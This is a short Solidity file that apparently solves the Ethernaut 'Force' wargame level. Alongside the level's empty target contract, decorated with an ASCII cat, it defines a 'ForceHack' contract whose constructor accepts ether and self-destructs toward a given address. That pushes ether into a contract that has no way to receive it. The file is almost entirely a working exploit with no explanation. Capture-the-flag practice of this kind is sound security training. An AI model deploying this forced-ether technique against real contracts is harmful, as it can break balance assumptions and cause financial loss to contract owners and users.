pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack{
    mapping(address=>uint) balanceOf;
    function ForceHack(address _instanceaddr) payable public{
        balanceOf[msg.sender] = msg.value;
        selfdestruct(_instanceaddr);
    }
    
}